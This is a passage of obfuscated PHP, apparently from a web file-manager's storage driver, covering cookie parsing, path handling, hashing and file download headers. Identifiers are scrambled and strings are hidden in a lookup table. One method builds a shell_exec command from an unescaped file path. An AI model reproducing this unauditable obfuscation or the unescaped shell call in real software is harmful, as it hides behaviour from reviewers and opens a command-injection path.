$“ä÷—ûÏ, $ùÄï˜Î• = 0) { self::set($©èš§óä, $“ä÷—ûÏ, $ùÄï˜Î•, !0); } public static function get($€¨¯é¦Û) { static $…ÈÉ‘À³ = false; if (!$…ÈÉ‘À³) { self::initHeaderCookie(); $…ÈÉ‘À³ = !0; } return isset($_COOKIE[$€¨¯é¦Û]) ? $_COOKIE[$€¨¯é¦Û] : !1; } private static function initHeaderCookie() { $Á«ùÉ  =& $_SERVER[–Ú¬çÁ]; if (!isset($_SERVER[$Á«ùÉ [903]]) || !$_SERVER[$Á«ùÉ [903]]) { return; } $ŒˆíŞä» = explode($Á«ùÉ [71], $_SERVER[$Á«ùÉ [903]]); foreach ($ŒˆíŞä» as $—ÚÓÙ›Ù) { $—ÚÓÙ›Ù = explode($Á«ùÉ [904], $—ÚÓÙ›Ù); if (count($—ÚÓÙ›Ù) != 2 || !isset($—ÚÓÙ›Ù[1])) { continue; } $_COOKIE[trim($—ÚÓÙ›Ù[0])] = trim($—ÚÓÙ›Ù[1]); } } public static function remove($ÖÂ•îÈş, $õˆï»Ï = false) { unset($_COOKIE[$ÖÂ•îÈş]); self::set($ÖÂ•îÈş, $_SERVER[–Ú¬çÁ][12], 1, $õˆï»Ï); } } goto bôÒ¨‘åå£; bÊÔæÄÊ†: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¬Ï›€ù· =& $_SERVER[–Ú¬çÁ]; $this->objectDriver = array($¬Ï›€ù·[60], $¬Ï›€ù·[61], $¬Ï›€ù·[62], $¬Ï›€ù·[63], $¬Ï›€ù·[64], $¬Ï›€ù·[65], $¬Ï›€ù·[66], $¬Ï›€ù·[67], $¬Ï›€ù·[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($”œ•“Üş) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($”œ•“Üş, $_SERVER[–Ú¬çÁ][8]); } return $”œ•“Üş; } public function iconvApp($²ªÑàë) { return $²ªÑàë; } public function iconvSystem($ìß¶Ñà±) { return $ìß¶Ñà±; } public function iconvTo($¿Åó±Óˆ, $•Ö“­é, $—µÙ§ª—) { $åŒÆÄ¥© =& $_SERVER[–Ú¬çÁ]; if (!$¿Åó±Óˆ || !function_exists($åŒÆÄ¥©[69])) { return $¿Åó±Óˆ; } static $¿Æ¾†Óä = array(); $—ÆºÜêù = $•Ö“­é . $åŒÆÄ¥©[70] . $—µÙ§ª— . $åŒÆÄ¥©[71] . $¿Åó±Óˆ; if (isset($¿Æ¾†Óä[$—ÆºÜêù])) { return $¿Æ¾†Óä[$—ÆºÜêù]; } if (function_exists($åŒÆÄ¥©[72])) { $Àµîãñä = @mb_convert_encoding($¿Åó±Óˆ, $—µÙ§ª—, $•Ö“­é); } else { $Àµîãñä = @iconv($•Ö“­é, $—µÙ§ª—, $¿Åó±Óˆ); } $Àµîãñä = $Àµîãñä ? $Àµîãñä : $¿Åó±Óˆ; if (strstr($Àµîãñä, $åŒÆÄ¥©[73])) { $Àµîãñä = str_replace($åŒÆÄ¥©[73], $åŒÆÄ¥©[11], $Àµîãñä); } $¿Æ¾†Óä[$•Ö“­é . $åŒÆÄ¥©[70] . $—µÙ§ª— . $åŒÆÄ¥©[71] . $¿Åó±Óˆ] = $Àµîãñä; $¿Æ¾†Óä[$—µÙ§ª— . $åŒÆÄ¥©[70] . $•Ö“­é . $åŒÆÄ¥©[71] . $¿Åó±Óˆ] = $¿Åó±Óˆ; $¿Æ¾†Óä[$—µÙ§ª— . $åŒÆÄ¥©[70] . $•Ö“­é . $åŒÆÄ¥©[71] . $Àµîãñä] = $¿Åó±Óˆ; $¿Æ¾†Óä[$•Ö“­é . $åŒÆÄ¥©[70] . $—µÙ§ª— . $åŒÆÄ¥©[71] . $Àµîãñä] = $Àµîãñä; return $Àµîãñä; } public function getPathInner($½Ú¹¬¦®) { $â¢ğ–İÆ = IO::init($½Ú¹¬¦®); return $â¢ğ–İÆ->path; } public function getPathOuter($çï¥áà) { $¿„º¾«Â =& $_SERVER[–Ú¬çÁ]; $€ìÍ±Éê = strlen(trim($this->pathBase, $¿„º¾«Â[8])); $çï¥áà = substr(trim($çï¥áà, $¿„º¾«Â[8]), $€ìÍ±Éê); return $this->pathDriver . $¿„º¾«Â[8] . ltrim($çï¥áà, $¿„º¾«Â[8]); } public function isParentOf($»êú–®, $ŠŸÊĞƒÈ) { $¥üÍ½¨Š =& $_SERVER[–Ú¬çÁ]; $»êú–® = rtrim(strtolower($»êú–®), $¥üÍ½¨Š[8]) . $¥üÍ½¨Š[8]; $ŠŸÊĞƒÈ = rtrim(strtolower($ŠŸÊĞƒÈ), $¥üÍ½¨Š[8]) . $¥üÍ½¨Š[8]; $£–ìëÓ = strpos($ŠŸÊĞƒÈ, $»êú–®) === 0; return $£–ìëÓ; } public function getType() { $ûê©©‹ë =& $_SERVER[–Ú¬çÁ]; $ÉÓ‘¿Å = str_replace($ûê©©‹ë[74], $ûê©©‹ë[12], get_class($this)); return strtolower($ÉÓ‘¿Å); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Åò¢¹·‚, $¼§ÇÚöÅ) { $Æ…×¼ÜĞ =& $_SERVER[–Ú¬çÁ]; $Õë­ş = rtrim($Åò¢¹·‚, $Æ…×¼ÜĞ[8]) . $Æ…×¼ÜĞ[8] . $¼§ÇÚöÅ; $şìÙ©Şµ = $this->exist($Õë­ş); return $şìÙ©Şµ ? $Õë­ş : !1; } public function setModifyTime($¼Íœ•æ, $¬¿¼äÜÆ = '') { } public function renameObject($ú•¥§‰, $³ÂƒéËà) { $‚ıÁ®®ó = $³ÂƒéËà; $ú•¥§‰ = $this->getPathOuter($ú•¥§‰); $³ÂƒéËà = $this->pathFather($ú•¥§‰) . $³ÂƒéËà; $ì³Šçù = IO::copy($ú•¥§‰, $this->pathFather($ú•¥§‰), REPEAT_RENAME_FOLDER, $‚ıÁ®®ó); if ($ì³Šçù) { IO::remove($ú•¥§‰); } return $ì³Šçù ? $³ÂƒéËà : !1; } public function tempFile($ä×ãßİ = '', $òÃ…†ß¹ = '') { if (!$ä×ãßİ) { $ä×ãßİ = rand_string(15); } $ ÙÂÔÏµ = TEMP_FILES . rand_string(15) . $_SERVER[–Ú¬çÁ][8]; @mkdir($ ÙÂÔÏµ, DEFAULT_PERRMISSIONS, !0); $§®áµò = $ ÙÂÔÏµ . $ä×ãßİ; @touch($§®áµò); if ($òÃ…†ß¹) { file_put_contents($§®áµò, $òÃ…†ß¹); } return $§®áµò; } public function tempFileRemve($¡ÓÂ´ó‹) { @unlink($¡ÓÂ´ó‹); @rmdir($this->pathFather($¡ÓÂ´ó‹)); } public function mkfile($ÄŸ¢ï‘È, $İÙ½ı‰ = '', $¡Éª²Å¾ = REPEAT_RENAME) { } public function mkdir($†Ñ‰ş¤‹, $ÚÛ¡Ïåª = REPEAT_SKIP) { } public function delFile($¨Ü‰Ü) { } public function delFolder($¦üñ•û¦) { } public function copyFile($ûçÁ¬á, $ÆÉ»£ñò) { } public function moveFile($×¬‘´Å÷, $Ë±âÍœ¶) { } public function remove($ÚşãàÜÚ) { if ($this->isFile($ÚşãàÜÚ)) { return $this->delFile($ÚşãàÜÚ); } return $this->delFolder($ÚşãàÜÚ); } public function rename($Ó–¦üºä, $‡¨ï‰‚Æ) { } public function exist($ÈÆ÷¦š) { } public function findByHash($õÀÒ©²Ç = '', $úòÀäÍ = '') { return !1; } public function isFile($ÂºƒŸ™) { } public function isFolder($Ş×êÕĞĞ) { } public function size($ˆÂÙ™…ø) { } public function info($òÅ¹üô) { } public function infoSimple($Ùå¥ªíÓ) { return $this->info($Ùå¥ªíÓ); } public function infoAuth($ÙùÜ®ı) { return $this->info($ÙùÜ®ı); } public function infoFull($¡®òşïƒ) { return $this->info($¡®òşïƒ); } public function infoFullSimple($Û¡Ë‡¸ğ) { return $this->info($Û¡Ë‡¸ğ); } public function infoWithChildren($œï›¾Õ¸) { $Ş€óÄü« =& $_SERVER[–Ú¬çÁ]; static $İšÕ€¹Û = array(); if (isset($İšÕ€¹Û[$œï›¾Õ¸])) { return $İšÕ€¹Û[$œï›¾Õ¸]; } $‡¾×¹úî = $this->info($œï›¾Õ¸); if ($‡¾×¹úî && $‡¾×¹úî[$Ş€óÄü«[33]] == $Ş€óÄü«[75]) { $Ä÷¯„Á = array($Ş€óÄü«[76] => 0, $Ş€óÄü«[77] => 0, $Ş€óÄü«[78] => 0); $this->infoChildren($œï›¾Õ¸, $Ä÷¯„Á); $‡¾×¹úî[$Ş€óÄü«[76]] = $Ä÷¯„Á[$Ş€óÄü«[76]]; $‡¾×¹úî[$Ş€óÄü«[79]] = array($Ş€óÄü«[80] => $Ä÷¯„Á[$Ş€óÄü«[77]], $Ş€óÄü«[81] => $Ä÷¯„Á[$Ş€óÄü«[78]]); $İšÕ€¹Û[$œï›¾Õ¸] = $‡¾×¹úî; } return $‡¾×¹úî; } public function listPath($Äšò— , $ùÛõÜÎ• = false) { } public function has($¢÷âÏú, $ëÄ¶‡‡» = false, $Ø¦‰£²à = false) { } public function canRead($‰Ï­¿šù) { } public function canWrite($¦¦±·—¤) { } public function getContent($èŸÅìç) { } public function setContent($± Ó‡§Í, $…ìğ‘Œƒ = '') { } protected function infoChildren($ô´ûë» , &$»’ÛÄéÜ) { $ñâ÷ÀÈ =& $_SERVER[–Ú¬çÁ]; check_abort_echo(); $çõÜ¿Ë = $this->listPath($ô´ûë» , !0); $çõÜ¿Ë = array_merge($çõÜ¿Ë[$ñâ÷ÀÈ[82]], $çõÜ¿Ë[$ñâ÷ÀÈ[83]]); foreach ($çõÜ¿Ë as $ëœãíº) { if ($ëœãíº[$ñâ÷ÀÈ[33]] == $ñâ÷ÀÈ[75]) { $»’ÛÄéÜ[$ñâ÷ÀÈ[78]]++; $¢ş¯¥Óí = $this->getPathInner($ëœãíº[$ñâ÷ÀÈ[84]]); $this->infoChildren($¢ş¯¥Óí, $»’ÛÄéÜ); } else { $»’ÛÄéÜ[$ñâ÷ÀÈ[77]]++; $»’ÛÄéÜ[$ñâ÷ÀÈ[76]] += $ëœãíº[$ñâ÷ÀÈ[76]]; } } } public function fileSubstr($ —æÈ½Ô, $Ã¨•ò¿ñ, $ºâäƒ¬Æ) { } public function listAll($™ù‰²Ì) { } public function listAllMake($°é—Ä²§, &$•³ë¹ê) { $İĞ²Ú¯â =& $_SERVER[–Ú¬çÁ]; check_abort_echo(); $½€®±êë = $this->listPath($°é—Ä²§, !0); if (!$½€®±êë) { return; } $Áñæ†¦² = array_merge($½€®±êë[$İĞ²Ú¯â[82]], $½€®±êë[$İĞ²Ú¯â[83]]); foreach ($Áñæ†¦² as $·à†…õ) { $ÛÂãËú” = $·à†…õ[$İĞ²Ú¯â[33]] == $İĞ²Ú¯â[75]; $®œ€˜Ì÷ = array($İĞ²Ú¯â[84] => $·à†…õ[$İĞ²Ú¯â[84]], $İĞ²Ú¯â[75] => $ÛÂãËú”); if (isset($·à†…õ[$İĞ²Ú¯â[76]])) { $®œ€˜Ì÷[$İĞ²Ú¯â[76]] = $·à†…õ[$İĞ²Ú¯â[76]]; } if (isset($·à†…õ[$İĞ²Ú¯â[85]])) { $®œ€˜Ì÷[$İĞ²Ú¯â[85]] = $·à†…õ[$İĞ²Ú¯â[85]]; } if (!$ÛÂãËú”) { $•³ë¹ê[] = $®œ€˜Ì÷; continue; } $•³ë¹ê[] = $®œ€˜Ì÷; $¥ŸƒÍ¯Ã = $·à†…õ[$İĞ²Ú¯â[84]]; $­ÛÀàÖÙ = $this->pathDriver; if (substr($·à†…õ[$İĞ²Ú¯â[84]], 0, strlen($­ÛÀàÖÙ)) == $­ÛÀàÖÙ) { $¥ŸƒÍ¯Ã = substr($¥ŸƒÍ¯Ã, strlen($­ÛÀàÖÙ)); } $this->listAllMake($¥ŸƒÍ¯Ã, $•³ë¹ê); } } public function listAllSimple($–şúÌ¯«, $Åï™ÛÊ¨ = false) { $–´‰˜Ë = $this->listAll($–şúÌ¯«); return $this->listAllSimpleMake($–´‰˜Ë, $this->getPathOuter($–şúÌ¯«), $Åï™ÛÊ¨); } public function listAllSimpleMake($ç— Ãí«, $ùµµ®÷Š, $Ò´æ¯ÁÅ) { $Ö«ŸÃ¥¾ =& $_SERVER[–Ú¬çÁ]; $€›ë‰—¨ = array(); $ùµµ®÷Š = rtrim(get_path_father($ùµµ®÷Š), $Ö«ŸÃ¥¾[8]) . $Ö«ŸÃ¥¾[8]; foreach ($ç— Ãí« as $ø¤‹‡¤Ÿ) { $•ô“¾½î = array($Ö«ŸÃ¥¾[84] => $ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[84]], $Ö«ŸÃ¥¾[86] => $ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[84]], $Ö«ŸÃ¥¾[75] => $ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[75]]); if (isset($ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[76]]) && !$ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[75]]) { $•ô“¾½î[$Ö«ŸÃ¥¾[76]] = $ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[76]]; } if (isset($ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[85]])) { $•ô“¾½î[$Ö«ŸÃ¥¾[85]] = $ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[85]]; } if (is_array($ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[87]])) { $•ô“¾½î[$Ö«ŸÃ¥¾[86]] = $ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[87]][$Ö«ŸÃ¥¾[84]]; $•ô“¾½î[$Ö«ŸÃ¥¾[76]] = $ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[87]][$Ö«ŸÃ¥¾[76]]; $•ô“¾½î[$Ö«ŸÃ¥¾[85]] = $ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[87]][$Ö«ŸÃ¥¾[85]]; } else { if (substr($ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[84]], 0, strlen($ùµµ®÷Š)) == $ùµµ®÷Š) { $•ô“¾½î[$Ö«ŸÃ¥¾[84]] = substr($ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[84]], strlen($ùµµ®÷Š)); } } $’ıÃáåÚ = $ø¤‹‡¤Ÿ[$Ö«ŸÃ¥¾[75]] ? $Ö«ŸÃ¥¾[8] : $Ö«ŸÃ¥¾[12]; $•ô“¾½î[$Ö«ŸÃ¥¾[86]] = rtrim($•ô“¾½î[$Ö«ŸÃ¥¾[86]], $Ö«ŸÃ¥¾[8]) . $’ıÃáåÚ; $•ô“¾½î[$Ö«ŸÃ¥¾[84]] = $Ö«ŸÃ¥¾[8] . trim($•ô“¾½î[$Ö«ŸÃ¥¾[84]], $Ö«ŸÃ¥¾[8]) . $’ıÃáåÚ; if (!$Ò´æ¯ÁÅ) { $íƒá•Æé = explode($Ö«ŸÃ¥¾[8], trim($•ô“¾½î[$Ö«ŸÃ¥¾[84]], $Ö«ŸÃ¥¾[8])); $•ô“¾½î[$Ö«ŸÃ¥¾[84]] = $Ö«ŸÃ¥¾[8] . implode($Ö«ŸÃ¥¾[8], array_slice($íƒá•Æé, 1)) . $’ıÃáåÚ; } $€›ë‰—¨[] = $•ô“¾½î; } return array_sort_by($€›ë‰—¨, $Ö«ŸÃ¥¾[84]); } public function upload($˜‰›§œ, $Ş«¹ì¢, $à³àó² = false, $ˆ§üˆ· = REPEAT_REPLACE) { } public function uploadFileByID($»¸ŸÑ½, $­ûÜ±Ó¼, $è²¸¤üŠ) { } public function uploadFileByPath($”€¾È‘›, $…ù³Ñí, $áÄ©Í— = array()) { } public function isUploadServer() { $ÉÉ¥¥¡ş =& $_SERVER[–Ú¬çÁ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÉÉ¥¥¡ş[88]) { return !0; } return $GLOBALS[$ÉÉ¥¥¡ş[6]][$ÉÉ¥¥¡ş[89]][$ÉÉ¥¥¡ş[90]]; } public function isFileOutServer() { $à†ğÁ× =& $_SERVER[–Ú¬çÁ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $à†ğÁ×[88]) { return !0; } return $GLOBALS[$à†ğÁ×[6]][$à†ğÁ×[89]][$à†ğÁ×[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($¼”‰ïæà) { $”»¶Âï‡ =& $_SERVER[–Ú¬çÁ]; if (!$this->isCdnHost()) { return $¼”‰ïæà; } return str_replace(trim(get_url_root($¼”‰ïæà), $”»¶Âï‡[8]), trim($this->cdnHost, $”»¶Âï‡[8]), $¼”‰ïæà); } public function uploadLink($Ö†àğ¥Å, $õò”š€ = 0) { $ÆˆõùÚ =& $_SERVER[–Ú¬çÁ]; if ($this->isUploadServer()) { return; } $¦ÀèØğ• = $this->getType(); if (!in_array($¦ÀèØğ•, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $«¦»ÒŠ = 1024 * 1024 * 10; $êÜÉ“Î– = $õò”š€ <= $«¦»ÒŠ ? $ÆˆõùÚ[92] : $ÆˆõùÚ[93]; $Ş¨¨Ş£ = (!$õò”š€ ? 1 : ceil($õò”š€ / pow(1024, 3))) * 3600 * 4; $‰›²Ø¾ = $this->{$êÜÉ“Î–}($Ö†àğ¥Å, $Ş¨¨Ş£); if ($‰›²Ø¾) { $‰›²Ø¾[$ÆˆõùÚ[94]] = $Ö†àğ¥Å; $‰›²Ø¾[$ÆˆõùÚ[95]] = $¦ÀèØğ•; } return $‰›²Ø¾; } public function uploadFormData($ïËŸÏ×ù, $´ÖÀŸ¿ù = 3600) { } public function multiUploadFormData($íıÄÈ÷‡, $ÅÂæÚÌ = 3600) { } public function download($²»Õ¼‰é, $Ã™æ£Š) { } public function ext($ˆªÃÀ÷ò) { $à¯Ú›¾ =& $_SERVER[–Ú¬çÁ]; if (strpos($ˆªÃÀ÷ò, $à¯Ú›¾[8]) === -1) { $«¨«¦»” = $ˆªÃÀ÷ò; } else { $«¨«¦»” = $this->pathThis($ˆªÃÀ÷ò); } $¬‚‰ßûÒ = $à¯Ú›¾[12]; if (strstr($«¨«¦»”, $à¯Ú›¾[10])) { $¬‚‰ßûÒ = substr($«¨«¦»”, strrpos($«¨«¦»”, $à¯Ú›¾[10]) + 1); $¬‚‰ßûÒ = strtolower($¬‚‰ßûÒ); } if (strlen($¬‚‰ßûÒ) > 3 && preg_match($à¯Ú›¾[96], $¬‚‰ßûÒ, $ÀÌİ—¢÷)) { $¬‚‰ßûÒ = $à¯Ú›¾[12]; } return $¬‚‰ßûÒ; } public function pathThis($íÍà—µÑ) { $¥§Ñ×½ =& $_SERVER[–Ú¬çÁ]; $íÍà—µÑ = str_replace($¥§Ñ×½[97], $¥§Ñ×½[8], rtrim($íÍà—µÑ, $¥§Ñ×½[8])); $€ŒÊ½Œ = strrpos($íÍà—µÑ, $¥§Ñ×½[8]); if ($€ŒÊ½Œ === !1) { return $íÍà—µÑ; } return substr($íÍà—µÑ, $€ŒÊ½Œ + 1); } public function pathFather($ÒµúÒóÂ) { $µëßÊ½Å =& $_SERVER[–Ú¬çÁ]; $ÒµúÒóÂ = str_replace($µëßÊ½Å[97], $µëßÊ½Å[8], rtrim($ÒµúÒóÂ, $µëßÊ½Å[8])); $ •×½§ = strrpos($ÒµúÒóÂ, $µëßÊ½Å[8]); if ($ •×½§ === !1) { return $µëßÊ½Å[12]; } return substr($ÒµúÒóÂ, 0, $ •×½§ + 1); } public function hashSimple($ñŠŸ¬Ìİ) { $ÏÑ¦îİô =& $_SERVER[–Ú¬çÁ]; if (!$ñŠŸ¬Ìİ) { return md5($ÏÑ¦îİô[12]); } $Ğ¾’ğ › = $this->size($ñŠŸ¬Ìİ); $Ö¦¥–ú = 200; $êµÊØè = 50; if ($Ğ¾’ğ › <= $Ö¦¥–ú * $êµÊØè) { return $this->hashMd5($ñŠŸ¬Ìİ) . $Ğ¾’ğ ›; } $ù¿–«•— = intval($Ğ¾’ğ › / $êµÊØè); $à×·â™Ù = $ÏÑ¦îİô[12]; for ($å€áòÚŞ = 0; $å€áòÚŞ < $êµÊØè; $å€áòÚŞ++) { $à×·â™Ù .= $this->fileSubstr($ñŠŸ¬Ìİ, $ù¿–«•— * $å€áòÚŞ, $Ö¦¥–ú); } $à×·â™Ù .= $this->fileSubstr($ñŠŸ¬Ìİ, $Ğ¾’ğ › - $Ö¦¥–ú, $Ö¦¥–ú); return md5($à×·â™Ù) . $Ğ¾’ğ ›; } public static $md5Cache = array(); public function hashMd5($ÏºÏÏƒ´) { if (!$ÏºÏÏƒ´) { return md5($_SERVER[–Ú¬çÁ][12]); } $ÏºÏÏƒ´ = $this->iconvSystem($ÏºÏÏƒ´); if (isset(self::$md5Cache[$ÏºÏÏƒ´])) { return self::$md5Cache[$ÏºÏÏƒ´]; } self::$md5Cache[$ÏºÏÏƒ´] = $this->hashMd5Shell($ÏºÏÏƒ´); if (!self::$md5Cache[$ÏºÏÏƒ´]) { self::$md5Cache[$ÏºÏÏƒ´] = @md5_file($ÏºÏÏƒ´); } return self::$md5Cache[$ÏºÏÏƒ´]; } private function hashMd5Shell($¦ûÄ¤Œ¤) { $‡¿¼Ğ“ì =& $_SERVER[–Ú¬çÁ]; if (!$¦ûÄ¤Œ¤) { return md5($‡¿¼Ğ“ì[12]); } if (!function_exists($‡¿¼Ğ“ì[98])) { return !1; } $îÅø¯‹« = array($‡¿¼Ğ“ì[99], $‡¿¼Ğ“ì[100]); $£—ôŒ¦³ = Cache::get($‡¿¼Ğ“ì[101]); if (!$£—ôŒ¦³) { $¼²İ±Î = BASIC_PATH . $‡¿¼Ğ“ì[102]; $‚ï—´¹ = md5_file($¼²İ±Î); $£—ôŒ¦³ = $‡¿¼Ğ“ì[103]; foreach ($îÅø¯‹« as $ÁÁ˜¿·ö) { $ÁÛ©ËÙô = shell_exec($ÁÁ˜¿·ö . "\x20\42{$¼²İ±Î}\x22"); if ($ÁÛ©ËÙô && substr(trim($ÁÛ©ËÙô), 0, 32) == $‚ï—´¹) { $£—ôŒ¦³ = $ÁÁ˜¿·ö; break; } } Cache::set($‡¿¼Ğ“ì[101], $£—ôŒ¦³, 3600); } if ($£—ôŒ¦³ == $‡¿¼Ğ“ì[103]) { return !1; } $ÁÛ©ËÙô = shell_exec($£—ôŒ¦³ . "\40\x22{$¦ûÄ¤Œ¤}\x22"); $ÁÛ©ËÙô = str_replace($‡¿¼Ğ“ì[104], $‡¿¼Ğ“ì[12], $ÁÛ©ËÙô); return substr($ÁÛ©ËÙô, 0, 32); } public function link($‰•×î…Ó) { return $‰•×î…Ó; } public function fileOut($§µË™‹«, $‘•Üãıù = false, $‚ú¾ùÂ÷ = false, $¹›¬Ï™Œ = '') { $€èÂ’ƒ‚ =& $_SERVER[–Ú¬çÁ]; $this->cacheMethod(null, null); if (!$§µË™‹« || !$this->exist($§µË™‹«)) { show_json(LNG($€èÂ’ƒ‚[105]), !1, $‚ú¾ùÂ÷); } $Ûğ™æİ = $this->getType() == $€èÂ’ƒ‚[106]; $ÛÎ²Š‹ = $GLOBALS[$€èÂ’ƒ‚[6]][$€èÂ’ƒ‚[89]][$€èÂ’ƒ‚[107]][$€èÂ’ƒ‚[108]]; $æÙáôßõ = (double) $GLOBALS[$€èÂ’ƒ‚[6]][$€èÂ’ƒ‚[89]][$€èÂ’ƒ‚[107]][$€èÂ’ƒ‚[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Ä«’µâ = $this->infoFull($§µË™‹«); $¥Ä¼¡‡Û = $Ä«’µâ[$€èÂ’ƒ‚[76]]; $³ö»‚„• = gmdate($€èÂ’ƒ‚[110], $Ä«’µâ[$€èÂ’ƒ‚[85]]); $ åä°Á² = $‚ú¾ùÂ÷ ? $‚ú¾ùÂ÷ : $this->iconvApp($Ä«’µâ[$€èÂ’ƒ‚[32]]); $­´ ×Âä = 0; $Ã†ø÷ÂÓ = $¥Ä¼¡‡Û - 1; $²êÍêÖ = $this->ext($ åä°Á²); if (in_array($²êÍêÖ, array($€èÂ’ƒ‚[111], $€èÂ’ƒ‚[112], $€èÂ’ƒ‚[113], $€èÂ’ƒ‚[114]))) { $²êÍêÖ = $€èÂ’ƒ‚[115]; } if (in_array($²êÍêÖ, array($€èÂ’ƒ‚[116]))) { $²êÍêÖ = $€èÂ’ƒ‚[117]; } if (!$¹›¬Ï™Œ) { $¹›¬Ï™Œ = md5($³ö»‚„• . $¥Ä¼¡‡Û); } $¹›¬Ï™Œ = $€èÂ’ƒ‚[118] . $¹›¬Ï™Œ . $€èÂ’ƒ‚[118]; $‡ƒ»Àâ = get_file_mime($²êÍêÖ); $ŞÒã™Â = !0; $ŞÒã™Â = isset($_GET[$€èÂ’ƒ‚[119]]) ? !1 : !0; if ($‘•Üãıù === !1 && !mime_support($‡ƒ»Àâ)) { $‡ƒ»Àâ = $€èÂ’ƒ‚[120]; } header($€èÂ’ƒ‚[121]); header($€èÂ’ƒ‚[122] . $‡ƒ»Àâ); $¶İ„Îçá = rawurlencode($ åä°Á²); $¶İ„Îçá = $€èÂ’ƒ‚[118] . $¶İ„Îçá . $€èÂ’ƒ‚[123] . $¶İ„Îçá; if ($‘•Üãıù) { header($€èÂ’ƒ‚[124]); header($€èÂ’ƒ‚[125] . $¶İ„Îçá); } else { if ($ŞÒã™Â) { header($€èÂ’ƒ‚[126] . $¶İ„Îçá); } } header($€èÂ’ƒ‚[127] . gmdate($€èÂ’ƒ‚[110], time() + 3600 * 24 * 30) . $€èÂ’ƒ‚[128]); header($€èÂ’ƒ‚[129]); header($€èÂ’ƒ‚[130]); header($€èÂ’ƒ‚[131]); if (isset($_SERVER[$€èÂ’ƒ‚[132]]) && strtotime($_SERVER[$€èÂ’ƒ‚[132]]) == $Ä«’µâ[$€èÂ’ƒ‚[85]]) { header($€èÂ’ƒ‚[133], !0, 304); die; } if (isset($_SERVER[$€èÂ’ƒ‚[134]]) && $_SERVER[$€èÂ’ƒ‚[134]] == $¹›¬Ï™Œ) { header($€èÂ’ƒ‚[135] . $¹›¬Ï™Œ, !0, 304); die; } header($€èÂ’ƒ‚[135] . $¹›¬Ï™Œ); header($€èÂ’ƒ‚[136] . $³ö»‚„• . $€èÂ’ƒ‚[128]); header($€èÂ’ƒ‚[137] . $ åä°Á²); header($€èÂ’ƒ‚[138]); header($€èÂ’ƒ‚[139] . $¥Ä¼¡‡Û); header($€èÂ’ƒ‚[140]); Hook::trigger($€èÂ’ƒ‚[141], $§µË™‹«, $¥Ä¼¡‡Û, $ åä°Á², $²êÍêÖ); if (!$‘•Üãıù && $²êÍêÖ == $€èÂ’ƒ‚[142]) { if ($¥Ä¼¡‡Û > 1024 * 1024 * 5) { die; } $Ä‰®¼° = $this->getContent($§µË™‹«); $Ä‰®¼° = Html::clearSVG($Ä‰®¼°); header($€èÂ’ƒ‚[143] . strlen($Ä‰®¼°)); echo $Ä‰®¼°; die; } $‡ÚéÕ»ò = strtolower($_SERVER[$€èÂ’ƒ‚[144]]); if ($Ûğ™æİ && $‡ÚéÕ»ò && $ÛÎ²Š‹) { if (strstr($‡ÚéÕ»ò, $€èÂ’ƒ‚[145])) { header($€èÂ’ƒ‚[146] . $§µË™‹«); } else { if (strstr($‡ÚéÕ»ò, $€èÂ’ƒ‚[147])) { header($€èÂ’ƒ‚[148] . $§µË™‹«); } else { if (strstr($‡ÚéÕ»ò, $€èÂ’ƒ‚[149])) { header($€èÂ’ƒ‚[150] . $§µË™‹«); } } } if ($æÙáôßõ) { header($€èÂ’ƒ‚[151] . $æÙáôßõ); } return; } if (isset($_SERVER[$€èÂ’ƒ‚[152]])) { if (preg_match($€èÂ’ƒ‚[153], $_SERVER[$€èÂ’ƒ‚[152]], $â·˜â²)) { $­´ ×Âä = intval($â·˜â²[1]); $­´ ×Âä = $­´ ×Âä <= 0 ? 0 : ($­´ ×Âä >= $Ã†ø÷ÂÓ ? $Ã†ø÷ÂÓ : $­´ ×Âä); if (!empty($â·˜â²[2])) { $ú‚Á·¿ = intval($â·˜â²[2]); $Ã†ø÷ÂÓ = $ú‚Á·¿ < $­´ ×Âä ? $­´ ×Âä : ($ú‚Á·¿ >= $Ã†ø÷ÂÓ ? $Ã†ø÷ÂÓ : $ú‚Á·¿); } } header($€èÂ’ƒ‚[154]); header("\103\157\x6e\x74\x65\x6e\164\x2d\x52\x61\x6e\x67\x65\x3a\40\142\x79\164\x65\x73\40{$­´ ×Âä}\55{$Ã†ø÷ÂÓ}\x2f" . $¥Ä¼¡‡Û); } else { header($€èÂ’ƒ‚[155]); } header($€èÂ’ƒ‚[156]); $Â³æ—İö = !0; if ($_SERVER[$€èÂ’ƒ‚[157]] == $€èÂ’ƒ‚[158] && $¥Ä¼¡‡Û > 1204 * 1024 * 1024 * 2) { $Â³æ—İö = !1; } if ($Â³æ—İö) { header($€èÂ’ƒ‚[159] . ($Ã†ø÷ÂÓ - $­´ ×Âä + 1)); } if ($_SERVER[$€èÂ’ƒ‚[160]] == $€èÂ’ƒ‚[161]) { return; } $óÉÅâÃ´ = 1024 * 100; $á¹ØÓå§ = 0; if ($æÙáôßõ) { $á¹ØÓå§ = intval(1000 * 1000 * ($óÉÅâÃ´ / $æÙáôßõ)); } while ($­´ ×Âä <= $Ã†ø÷ÂÓ) { $ôÌ¼ô¼Ü = timeFloat(); check_abort(); $Æ¢¯âÌ = $Ã†ø÷ÂÓ - $­´ ×Âä + 1; if ($Æ¢¯âÌ <= $óÉÅâÃ´) { $óÉÅâÃ´ = $Æ¢¯âÌ; 